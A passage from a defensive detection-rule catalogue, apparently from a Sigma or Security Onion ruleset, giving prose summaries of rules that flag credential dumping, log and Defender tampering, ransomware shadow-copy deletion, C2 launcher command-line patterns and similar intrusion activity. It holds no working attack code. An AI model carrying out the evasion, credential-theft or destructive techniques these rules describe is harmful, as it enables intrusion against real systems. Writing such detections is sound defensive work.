  Rule-Body-Hash: c85c7b8eb9b5e465af5a9c30191fc58d
  Ruleset: sigmahq
  Summary: This rule detects the use of the `env` command to invoke a shell on Linux
    systems. This behavior may indicate attempts to bypass restricted environments,
    escalate privileges, or execute arbitrary commands. The detection mechanism looks
    for processes where the image ends with `/env` and the command line ends with
    one of several common shell binaries, such as `/bin/bash`, `/bin/dash`, `/bin/fish`,
    `/bin/sh`, or `/bin/zsh`.
  Updated-Date: '2024_09_04'
bedfc8ad-d1c7-4e37-a20e-e2b0dbee759c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c0063f7f255a56829eb1f4321ba442b
  Ruleset: core
  Summary: This rule detects the execution of SharpEvtMute, a tool that manipulates
    Windows event logs to evade detection. SharpEvtMute is commonly used in defense
    evasion tactics by modifying event logs to remove traces of malicious activity.
    The rule identifies instances where the executable file named 'SharpEvtMute.exe'
    is run, specifically looking for the provided description and certain command
    line parameters indicative of SharpEvtMute activity. This detection aims to highlight
    unauthorized tampering with event logs, which can be a sign of malicious actions
    attempting to bypass security monitoring.
  Updated-Date: '2024_09_03'
bef0bc5a-b9ae-425d-85c6-7b2d705980c6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a0ac6f9ae534ee0b9d820b5a749ddb04
  Ruleset: sigmahq
  Summary: This rule detects instances where a Python process initiates a network
    connection. While such connections are often related to legitimate activities
    like package installation or updates, they can also indicate malicious scripts
    potentially communicating with a Command and Control (C&C) server. The detection
    filters out known benign behaviors such as Anaconda updates or Jupyter Notebook
    instances by examining command-line details and parent images. Additionally, it
    excludes local communications typically used by Python scripts, to avoid false
    positives.
  Updated-Date: '2024_09_04'
bef37fa2-f205-4a7b-b484-0759bfd5f86f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7de903410dda6cfeb15817c2b13c2742
  Ruleset: sigmahq
  Summary: This rule detects the execution of Advanced IP Scanner, a network scanning
    tool frequently utilized by ransomware groups. It monitors for the presence of
    specific file paths, filenames, and descriptions indicative of Advanced IP Scanner,
    as well as particular command-line arguments that suggest its portable usage.
    Despite potential legitimate administrative applications, the use of this software
    is flagged due to its association with malicious activities in various ransomware
    campaigns.
  Updated-Date: '2024_09_04'
bf241472-f014-4f01-a869-96f99330ca8c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f707d86b72750ff6bc49915735400ab3
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "hdiutil" utility on macOS systems
    to monitor the mounting of disk images. The rule looks for specific command line
    arguments, such as 'attach' and 'mount,' that are associated with the utility's
    disk image operations. Although legitimate use by administrators and users is
    possible, the rule helps identify potential unauthorized or malicious activity
    related to disk image mounting.
  Updated-Date: '2024_09_04'
bf344fea-d947-4ef4-9192-34d008315d3a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e34e2ec3bcf6e0c19c34447828fe7fb6
  Ruleset: sigmahq
  Summary: This rule detects the installation of new shim databases that attempt to
    patch specific known processes such as `csrss.exe` and `explorer.exe`. These activities
    are associated with potential process injection or persistence techniques often
    used by malicious actors. The rule monitors changes in the Windows registry, particularly
    within the path `\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\`,
    to identify suspicious activity that could indicate the utilization of shim databases
    for maintaining persistence on a compromised system.
  Updated-Date: '2024_09_04'
bf4fc428-dcc3-4bbd-99fe-2422aeee2544:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 971ffc9e7310c86eca9e426d650a6a52
  Ruleset: core
  Summary: This rule detects the disabling of Event Tracing for Windows (ETW) logging
    in .NET processes on Windows systems. ETW is used to record loaded .NET assemblies,
    and potential adversaries may stop ETW providers to evade logging and defense
    mechanisms. The detection focuses on specific registry modifications related to
    ETW settings, including changes to the 'SOFTWARE\Microsoft\.NETFramework\ETWEnabled'
    registry path and registry values associated with 'COMPlus_ETWEnabled' and 'COMPlus_ETWFlags'.
    ETW disabling indicates possible attempts to conceal malicious activities within
    .NET applications.
  Updated-Date: '2024_09_03'
bf638ef7-4d2d-44bb-a1dc-a238252e6267:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f74435529a9d1664930e04bb5d71c884
  Ruleset: sigmahq
  Summary: This rule detects when a role privilege is deleted within Google Workspace.
    The specific action monitored is the "REMOVE_PRIVILEGE" event from the Google
    Workspace Admin service. This rule helps administrators keep track of changes
    in role privileges, which can be critical for maintaining security and proper
    access controls within their Google Workspace environment.
  Updated-Date: '2024_09_04'
bf72941a-cba0-41ea-b18c-9aca3925690d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b65ef74963293cbffec2cba8bed90257
  Ruleset: core
  Summary: This rule detects the execution of the ADRecon.ps1 PowerShell script, which
    is used for Active Directory reconnaissance. This script has been linked to the
    cybercriminal group FIN7. The detection is based on identifying specific function
    names and the default report file name within PowerShell script block text.
  Updated-Date: '2024_09_03'
bf86ef21-41e6-417b-9a05-b9ea6bf28a38:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0815f5760168818beec03f061397542e
  Ruleset: securityonion-resources
  Summary: This rule detects when a user fails to login to the Security Onion Console
    (Web UI). It identifies login errors by monitoring audit logs from the Kratos
    service for messages indicating a self-service login error. Further investigation
    should include reviewing associated logs to identify the target username and the
    source IP involved in the failed login attempt.
  Updated-Date: '2024_08_07'
bf906d7b-7070-4642-8383-e404cf26eba5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 43480c0c68d1803c4e54595b6164d846
  Ruleset: emerging-threats
  Summary: This rule detects the creation of local user accounts via the net.exe command
    with a username that includes "DarkGate," specifically for persistence purposes
    by malicious actors. The detection is based on monitoring process creation in
    Windows, where instances of net.exe or net1.exe are flagged if their command line
    parameters contain 'user,' 'add,' 'DarkGate,' and 'SafeMode.'
  Updated-Date: '2024_09_03'
bf9808c4-d24f-44a2-8398-b65227d406b6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 92aece6dc43f02a868526c176f219023
  Ruleset: sigmahq
  Summary: This rule detects the potential sideloading of "libvlc.dll," a dynamic
    link library (DLL) legitimately used by "VLC.exe." DLL sideloading is a method
    often exploited by malware to execute malicious code through a trusted application,
    circumventing security measures. The rule specifically monitors the loading of
    "libvlc.dll" from non-default installation locations, which could indicate an
    attempt to misuse this file for unauthorized purposes.
  Updated-Date: '2024_09_04'
bf9e1387-b040-4393-9851-1598f8ecfae9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8cf4a46f48e59bf9462f696a887d9719
  Ruleset: sigmahq
  Summary: This rule detects the disabling of Windows Defender Exploit Guard Network
    Protection by monitoring changes in the Windows registry. Specifically, it looks
    for modifications to the registry key 'SOFTWARE\Policies\Microsoft\Windows Defender
    Security Center\App and Browser protection\DisallowExploitProtectionOverride',
    where the 'Details' field is set to 'DWORD (00000001)'. This activity is associated
    with defense evasion tactics, potentially relating to malware or unauthorized
    changes aimed at weakening system defenses.
  Updated-Date: '2024_09_04'
bfbd3291-de87-4b7c-88a2-d6a5deb28668:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 23a341e4eb49da9fc4a6130f234638af
  Ruleset: core
  Summary: This rule detects the creation of certificates using templates that possess
    risky permissions and potentially dangerous Enhanced Key Usages (EKUs) on Windows
    systems. By monitoring event IDs 4898 and 4899, the rule identifies when templates
    contain specific EKUs, such as '1.3.6.1.5.5.7.3.2' and '2.5.29.37.0', and a flag
    indicating that the enrollee provides the subject. This could be an indicator
    of privilege escalation or credential access attempts within the environment.
  Updated-Date: '2024_09_03'
bfd34392-c591-4009-b938-9fd985a28b85:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d7dad8350c76329fcbfb937f09198703
  Ruleset: emerging-threats
  Summary: This rule detects specific process tree behavior involving the execution
    of "rundll32" where the DLL file lacks the typical ".dll" extension, potentially
    indicating Qakbot activity. Qakbot is a form of malware known for its capabilities
    in defense evasion and execution, often using unconventional DLL extensions to
    avoid detection. The rule focuses on monitoring certain parent processes and command
    line paths frequently associated with Qakbot to identify this suspicious activity
    on Windows systems.
  Updated-Date: '2024_09_03'
c01f7bd6-0c1d-47aa-9c61-187b91273a16:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cbccd7f08fd6b8ea369b9a0f3634cae4
  Ruleset: emerging-threats
  Summary: This rule detects an exploitation attempt aimed at leveraging SystemNightmare,
    a known vulnerability, to obtain a shell with LOCAL_SYSTEM privileges. It identifies
    suspicious process creation activities on Windows systems, specifically targeting
    command-line executions containing references to 'printnightmare.gentilkiwi.com,'
    '/user:gentilguest,' and 'Kiwi Legit Printer.'
  Updated-Date: '2024_09_03'
c0239255-822c-4630-b7f1-35362bcb8f44:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7161ba0e812c37d313ae6d81d76800a8
  Ruleset: core
  Summary: This rule detects the creation of the file "rootlog," which is utilized
    by the TripleCross eBPF Rootkit to verify if its backdoor is already active. The
    presence of this file can indicate that the TripleCross rootkit, known for its
    capabilities in defense evasion, is operating on a Linux system.
  Updated-Date: '2024_09_03'
c0341543-5ed0-4475-aabc-7eea8c52aa66:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 913cfeedd60a551d64c46c5d5b9093da
  Ruleset: emerging-threats
  Summary: This rule detects a potential exploitation attempt of CVE-2023-25157, which
    is a SQL injection vulnerability in GeoServer. The detection focuses on specific
    patterns within the webserver logs, such as HTTP GET requests to '/geoserver/ows'
    containing the 'CQL_FILTER=' parameter, and certain SQL-related strings like 'PropertyIsLike',
    'strEndsWith', 'strStartsWith', among others. The rule looks for common SQL injection
    indicators in the query, including operators and commands such as 'SELECT', 'FROM',
    'UNION', 'ORDER BY', and specific functions like 'sleep' and 'substring'. The
    intent is to identify malicious attempts to exploit this particular CVE, although
    it may also flag activity from vulnerability scanners as false positives.
  Updated-Date: '2024_09_03'
c048f047-7e2a-4888-b302-55f509d4a91d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c0f17d5cd8dcff0a0fc616250f618351
  Ruleset: sigmahq
  Summary: This rule detects the creation of screensaver files (.scr) outside of typical
    system directories on a Windows system. Attackers may use screensaver files to
    execute malicious applications, often leveraging "rundll32.exe desk.cpl,InstallScreenSaver"
    to do so. It identifies such potentially malicious activity by examining file
    creation events that match the .scr extension but are not stored in specific system-related
    folders.
  Updated-Date: '2024_09_04'
c0580559-a6bd-4ef6-b9b7-83703d98b561:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f73006fc215c3a3ad30cb70ba7a21d29
  Ruleset: emerging-threats
  Summary: This rule detects the persistence mechanism employed by the OilRig advanced
    persistent threat (APT) group through scheduled tasks on Windows systems, as detailed
    in Nyotron's March 2018 report. It identifies the creation of specific scheduled
    tasks, namely 'SC Scheduled Scan' and 'UpdatMachine', which are indicative of
    OilRig's tactics. The presence of such tasks can signify that the system is compromised,
    aligned with OilRig's known methods for maintaining access and evading defenses.
  Updated-Date: '2024_09_03'
c09dad97-1c78-4f71-b127-7edb2b8e491a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75487dbdf53326d9feffc1d1d809578c
  Ruleset: sigmahq
  Summary: This rule detects the execution of processes where the image specified
    in the creation event does not refer to a known executable file extension such
    as ".exe". This anomaly can occur due to techniques like process ghosting or other
    unconventional methods of starting a process. It requires some baseline adjustment
    to align with third-party tools within the user environment and includes various
    filters to exclude legitimate system utilities, installers, driver store activities,
    temporary files, and specific program-related processes from known vendors like
    Avira, NVIDIA, and Mozilla Firefox.
  Updated-Date: '2024_09_04'
c0aac16a-b1e7-4330-bab0-3c27bb4987c7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 16fb93aa31bfcf277701d3731f1dc2a8
  Ruleset: sigmahq
  Summary: This rule detects remote thread creation in the "mstsc.exe" process from
    a process located in potentially suspicious directories such as temporary directories
    or public folders. This technique is commonly exploited by attackers to hook APIs
    used by DLLs loaded during Remote Desktop Protocol (RDP) authentications to steal
    credentials.
  Updated-Date: '2024_09_04'
c0b2768a-dd06-4671-8339-b16ca8d1f27f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 600299cf27a3db05f30ece1c94f5f4ab
  Ruleset: sigmahq
  Summary: This rule detects the use of the `fsutil.exe` utility to modify symbolic
    link behavior settings on a Windows system. The rule specifically looks for command-line
    activity where the `fsutil` command includes the terms "behavior," "set," and
    "SymlinkEvaluation." This activity is potentially associated with ransomware,
    such as BlackCat, which may modify symbolic link settings to follow shortcuts
    for locating and encrypting original files.
  Updated-Date: '2024_09_04'
c0b40568-b1e9-4b03-8d6c-b096da6da9ab:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b17b11d0df655420589b78ac7437bb46
  Ruleset: core
  Summary: This rule detects the execution of the binary `AgentExecutor.exe`, which
    can be exploited as a Living Off The Land Binary (LOLBIN) to execute PowerShell
    scripts with the ExecutionPolicy set to "Bypass" or any binary named `powershell.exe`
    located in the path provided by the 6th positional argument. The rule identifies
    instances of `AgentExecutor.exe` by checking if the command line contains specific
    flags, such as `-powershell` or `-remediationScript`. It also filters out cases
    when the command line contains specific paths related to legitimate PowerShell
    locations or when the parent process is `Microsoft.Management.Services.IntuneWindowsAgent.exe`.
  Updated-Date: '2024_09_03'
c0c67b21-eb8a-4c84-a395-40473ec3b482:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 352a0bd9c8a581e82f69901029aa796f
  Ruleset: emerging-threats
  Summary: This rule detects the setting of a new value in the Windows Autorun registry
    key used by the Kapeka backdoor for persistence. Kapeka is a type of malware known
    for maintaining its presence on infected systems by adding specific entries in
    the registry. The detection focuses on identifying modifications where the target
    object path contains specific strings associated with Windows startup processes,
    and the details of the entry include references to 'rundll32.exe' and a file with
    the extension '.wll' followed by '#1'.
  Updated-Date: '2024_09_03'
c0d3734d-330f-4a03-aae2-65dacc6a8222:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a795e7e836ec422e96378c75a423def6
  Ruleset: core
  Summary: This rule detects possible command execution by a web application or web
    shell on a Linux system using auditd. It focuses on monitoring the 'execve' system
    call specific to the web server user, which is typically 'www-data' with user
    ID 33, though the ID can be adjusted for different configurations. This rule aims
    to identify unauthorized or suspicious execution of commands through a web interface,
    which may indicate a web shell attack or persistence method. Potential false positives
    include legitimate administrative activities or unusually functioning web applications.
  Updated-Date: '2024_09_03'
c1182e02-49a3-481c-b3de-0fadc4091488:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: affd2a8ff258ce2a79965c9dfd64c09c
  Ruleset: sigmahq
  Summary: This rule detects uncommon subscription-level operations in Azure that
    indicate unusual user behavior, focusing on alerts when a previously unseen source
    IP address is used to grant access to other users on Azure resources. It specifically
    monitors for operations like listing keys in various Microsoft services (e.g.,
    DocumentDB, Maps, Media Services, Cognitive Services, and Storage Accounts) and
    writing actions to Compute snapshots and Network Security Groups.
  Updated-Date: '2024_09_04'
c1337eb8-921a-4b59-855b-4ba188ddcc42:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7369148871cb452164a77b07ebd31a41
  Ruleset: core
  Summary: This rule detects the deletion of Windows Volume Shadow Copies using PowerShell
    code that utilizes the Get-WMIObject (or its aliases) commands. This technique,
    often employed by ransomware families such as Sodinokibi/REvil, involves leveraging
    Windows Management Instrumentation (WMI) commands to identify and delete Volume
    Shadow Copies, which are critical for data restoration and recovery. This action
    is typically indicative of malicious behavior aiming to disable system recovery
    capabilities and ensure data hostage tactics.
  Updated-Date: '2024_09_03'
c1344fa2-323b-4d2e-9176-84b4d4821c88:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05f0851831331f9d056a169447cf803c
  Ruleset: sigmahq
  Summary: This rule detects modifications to the Windows Defender configuration settings
    using PowerShell by identifying script blocks that contain commands to add exclusions,
    such as paths, extensions, processes, or IP addresses. The detection mechanism
    relies on recognizing specific PowerShell cmdlets like `Add-MpPreference` and
    `Set-MpPreference`. This behavior can indicate an attempt to evade defenses by
    excluding certain entities from being scanned by Windows Defender.
  Updated-Date: '2024_09_04'
c15a46a0-07d4-4c87-b4b6-89207835a83b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: da28b252cb431fe936e2fdb50206aebe
  Ruleset: sigmahq
  Summary: This rule detects the usage of the Windows Package Manager, winget, to
    add new potentially suspicious download sources. Specifically, it monitors for
    the execution of the winget executable and looks for command lines containing
    "source add," as well as patterns indicating the use of direct IP addresses in
    the source URL. This behavior can be indicative of an attempt to introduce untrusted
    or malicious sources to winget, which may be used for defense evasion or malicious
    execution purposes.
  Updated-Date: '2024_09_04'
c15e99a3-c474-48ab-b9a7-84549a7a9d16:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 993cf992a36f173d8bf00886bb3cb85b
  Ruleset: core
  Summary: This rule detects the creation of a remote thread involving Ttdinject.exe,
    a known binary used as a proxy for potentially malicious activities. This detection
    is primarily concerned with observing defense evasion techniques where Ttdinject.exe
    is leveraged to execute code in the address space of another process.
  Updated-Date: '2024_09_03'
c187c075-bb3e-4c62-b4fa-beae0ffc211f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d251ce59c50b5fccc9575202f659c04a
  Ruleset: sigmahq
  Summary: This rule detects when a rule has been deleted from the Windows Defender
    Firewall exception list on Windows systems. Specific Event IDs, such as 2006 and
    2052, trigger the detection of these deletions. The rule includes filtering mechanisms
    to exclude certain modifying applications and paths, ensuring accuracy by ruling
    out legitimate actions performed by well-known system paths and applications like
    `svchost.exe` and `MsMpEng.exe`. This is particularly relevant for identifying
    potential defense evasion techniques by malicious actors who might attempt to
    disable firewall rules to bypass security measures.
  Updated-Date: '2024_09_04'
c191e2fa-f9d6-4ccf-82af-4f2aba08359f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7b3f522d5baca9d48278672c86339393
  Ruleset: sigmahq
  Summary: This rule detects instances where a user logs into Microsoft sanctioned
    apps from a risky IP address, as reported by Microsoft Cloud App Security. It
    identifies such events by monitoring for successful logon attempts flagged by
    the Security Compliance Center, signaling potential unauthorized access or compromised
    accounts.
  Updated-Date: '2024_09_04'
c1d147ae-a951-48e5-8b41-dcd0170c7213:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 79281fcf8b2c69699faa6701e4d7417a
  Ruleset: core
  Summary: This rule detects when an application is granted either delegated or app
    role permissions for services like Microsoft Graph, Exchange, SharePoint, or Azure
    AD. This event can indicate potentially unauthorized privilege escalation within
    Azure environments.
  Updated-Date: '2024_09_03'
c1d867fe-8d95-4487-aab4-e53f2d339f90:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 88781c3ab94309ea44ab1ff6e17f3601
  Ruleset: core
  Summary: This rule detects the execution of a renamed Sysinternals Sdelete utility
    on Windows. Sdelete is a secure delete tool used to overwrite and delete files
    permanently. Renaming this tool is unusual and generally not a typical practice
    for system administrators, indicating potentially suspicious activity. The rule
    triggers when the original file name 'sdelete.exe' is used but does not match
    the expected image path, suggesting the file has been renamed.
  Updated-Date: '2024_09_03'
c1dda054-d638-4c16-afc8-53e007f3fbc5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: acb808929389a0465856c99b1d091af0
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell commands that automate the collection
    of internal data within a Windows system or network. Specifically, it monitors
    for script block text that includes the PowerShell cmdlet 'Get-ChildItem' in combination
    with the '-Recurse' and '-Include' parameters, suggesting a search for files with
    specific extensions such as '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.rtf', '.pdf', and '.txt'. This behavior is typical of adversaries attempting
    to gather documents and data files from a compromised system.
  Updated-Date: '2024_09_04'
c248c896-e412-4279-8c15-1c558067b6fa:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 098b7dd7f10ec58c14aa45735b9b18da
  Ruleset: sigmahq
  Summary: This rule detects the execution of "whoami.exe" with the "/all" flag on
    Windows systems. "Whoami.exe" is a command-line utility that displays user, group,
    and privilege information for the current user. The detection is significant in
    identifying attempts to gather extensive user information, often utilized in post-exploitation
    stages by attackers aiming to understand the rights available to the compromised
    account.
  Updated-Date: '2024_09_04'
c2496b41-16a9-4016-a776-b23f8910dc58:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42e324d36205fba11fb782e2a0dc12c4
  Ruleset: sigmahq
  Summary: This rule detects when certificate-based authentication has been enabled
    in an Azure Active Directory tenant. It identifies an "Authentication Methods
    Policy Update" operation where the modified properties contain 'AuthenticationMethodsPolicy.'
    This action is pertinent to potential persistence and privilege escalation threats
    within the Azure environment.
  Updated-Date: '2024_09_04'
c260b6db-48ba-4b4a-a76f-2f67644e99d2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c2ebd36ad44d5d45ff80b201539875c1
  Ruleset: core
  Summary: This rule detects suspicious command lines associated with Covenant, a
    command and control framework often used for post-exploitation activities. Specifically,
    it identifies command lines that configure PowerShell instances with parameters
    such as `-Sta`, `-Nop`, `-Window Hidden`, and `-Command` or `-EncodedCommand`,
    which are indicative of attempts to execute scripts in a stealthy manner. Additionally,
    it looks for specific patterns like `sv o (New-Object IO.MemorySteam);sv d`, references
    to `mshta file.hta`, and `GruntHTTP`, all of which are indicative of Covenant
    launchers. This rule aims to uncover the stealth tactics used for malicious activity
    execution and defense evasion.
  Updated-Date: '2024_09_03'
c265cf08-3f99-46c1-8d59-328247057d57:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 31baa3fe299c80e2732aba8871954c27
  Ruleset: sigmahq
  Summary: This rule detects the addition of a new member to the local administrator
    group in Windows systems. It monitors for specific event IDs associated with such
    activity, focusing on identifying target usernames and security identifiers linked
    to administrative groups. This activity could indicate legitimate administrative
    actions or potential signs of privilege escalation and persistence by malicious
    actors.
  Updated-Date: '2024_09_04'
c27515df-97a9-4162-8a60-dc0eeb51b775:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2f502cd9627b7f24fcbbcda5747c1061
  Ruleset: core
  Summary: This rule detects the execution of suspicious child processes originating
    from the Microsoft OneNote application. This behavior may indicate attempts to
    run malicious embedded objects within a .one file. The rule flags processes when
    OneNote spawns subsequent processes like `cmd.exe`, `powershell.exe`, `mshta.exe`,
    and several others that are commonly used in attack scenarios. Additionally, it
    looks for specific file paths and command line arguments typically associated
    with malicious activity. The rule includes filters to reduce false positives from
    legitimate Microsoft Teams and OneDrive processes.
  Updated-Date: '2024_09_03'
c2993223-6da8-4b1a-88ee-668b8bf315e9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 18067dc02376e7538b06a3d3028a4d6c
  Ruleset: sigmahq
  Summary: This rule detects the usage of the PowerShell cmdlet Get-ADUser to gather
    user information and export the collected data to a file. The rule specifically
    looks for script blocks containing the use of the Get-ADUser command with filters,
    combined with output redirection commands such as '>', ' | Select ', 'Out-File',
    'Set-Content', or 'Add-Content'. This activity is typically associated with discovery
    techniques used in various cyber threats, potentially indicating unauthorized
    access to and exfiltration of Active Directory user data.
  Updated-Date: '2024_09_04'
c2b86e67-b880-4eec-b045-50bc98ef4844:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 875a16f7fac50a2e246e698708ea5587
  Ruleset: sigmahq
  Summary: This rule detects the execution of LaZagne, a utility designed to retrieve
    various types of passwords stored on a local computer. Usage of LaZagne has been
    observed in multiple incidents where threat actors employ it to dump credentials.
    The rule looks for executable files named "lazagne.exe" and analyzes command-line
    arguments related to LaZagne's known modules and options to identify suspicious
    activity that may indicate credential dumping attacks.
  Updated-Date: '2024_09_04'
c2c76b77-32be-4d1f-82c9-7e544bdfe0eb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99dfed782e1bb82b3122e5008e877efb
  Ruleset: sigmahq
  Summary: This rule detects potential suspicious activity involving the use of secedit.exe,
    such as exporting or modifying the security policy. Specific command line arguments
    are monitored to identify when security policies might be exported via the '/export'
    and '/cfg' flags or configured using the '/configure' and '/db' flags.
  Updated-Date: '2024_09_04'
c2e234de-03a3-41e1-b39a-1e56dc17ba67:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fa3feb1133dd5065d6c1dfc8495231d0
  Ruleset: sigmahq
  Summary: This rule detects the use of the 'crontab' utility to remove the current
    crontab in a Linux environment. Such activity commonly occurs when cryptocurrency
    miners attempt to eliminate competing miners' scheduled tasks in order to monopolize
    system resources.
  Updated-Date: '2024_09_04'
c30fb093-1109-4dc8-88a8-b30d11c95a5d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aa95debe44fda2574b555f2e3195e8cf
  Ruleset: sigmahq
  Summary: This rule detects the execution of "whoami.exe" with the "/FO" flag to
    select CSV as the output format or with redirection options to export the results
    to a file for later use.
  Updated-Date: '2024_09_04'
c31364f7-8be6-4b77-8483-dd2b5a7b69a3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5c99b33775c52b00738aabcb24819626
  Ruleset: sigmahq
  Summary: This rule detects PowerShell scripts that import modules from suspicious
    directories such as the Temp or Appdata folders, or the C:\Users\Public\ directory.
    Suspicious activity is identified by the presence of specific command lines that
    use 'Import-Module' or its alias 'ipmo' with paths pointing to these directories.
    This behavior may be indicative of malicious scripts attempting to execute unwanted
    code or malware by loading modules from locations typically used for temporary
    files or user-specific data.
  Updated-Date: '2024_09_04'
c3198a27-23a0-4c2c-af19-e5328d49680e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5d54fec812145bdb54cf6349915522d
  Ruleset: emerging-threats
  Summary: This rule detects system changes potentially made by the Blue Mockingbird
    malware, which is known for employing cryptomining activities. It monitors Windows
    process creations for specific command line activities associated with altering
    service configurations and environment variables. Specifically, it looks for the
    use of `cmd.exe` modifying service configurations using the `sc config` command
    to incorporate `wercplsupporte.dll`, and `wmic.exe` setting the `COR_PROFILER`
    environment variable. This helps in identifying unauthorized changes that may
    indicate the presence of the Blue Mockingbird attack.
  Updated-Date: '2024_09_03'
c363385c-f75d-4753-a108-c1a8e28bdbda:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1103e094aeb2375d9edf81d970e3d2c0
  Ruleset: core
  Summary: This rule detects potential misuse of the "manage-bde.wsf" script, typically
    used for managing BitLocker encryption, as a living-off-the-land binary (LOLBIN)
    to proxy execution. The rule targets processes where "wscript.exe" or "cscript.exe"
    invoke "manage-bde.wsf" either directly through the command line or as a parent
    process, excluding scenarios where "cmd.exe" is involved. This type of behavior
    could indicate an attempt to evade defense mechanisms by leveraging legitimate
    Windows scripts for malicious purposes.
  Updated-Date: '2024_09_03'
c37510b8-2107-4b78-aa32-72f251e7a844:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 71ffe57074c2a028747d8e047c54b63c
  Ruleset: emerging-threats
  Summary: 'This rule detects potential Ryuk ransomware activity on Windows systems.
    Ryuk ransomware is known for targeting organizations'' networks to encrypt data
    and demand ransom. The detection focuses on specific command line activities:
    modifications to the Windows registry''s Run key, mass deletion of files with
    backup extensions using the ''del'' command, and the use of ''net.exe'' or ''net1.exe''
    to stop critical services like ''samss'' and ''audioendpointbuilder''. These actions
    are indicative of Ryuk''s persistence, elimination of backups, and network lateral
    movement, posing a significant threat to enterprise environments.'
  Updated-Date: '2024_09_03'
c39f0c81-7348-4965-ab27-2fde35a1b641:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f387a732e1c6cbbe9506e5d6994c055e
  Ruleset: core
  Summary: This rule detects a threat actor creating a file named `iertutil.dll` in
    the `C:\Program Files\Internet Explorer\` directory over the network to execute
    a DCOM InternetExplorer DLL Hijack attack. This scenario is identified through
    the observation of specific event logs that flag this activity, particularly focusing
    on network file operations related to the Internet Explorer directory. The rule
    filters out events involving system accounts, aiming to highlight unauthorized
    or suspicious actions.
  Updated-Date: '2024_09_03'
c3a99af4-35a9-4668-879e-c09aeb4f2bdf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
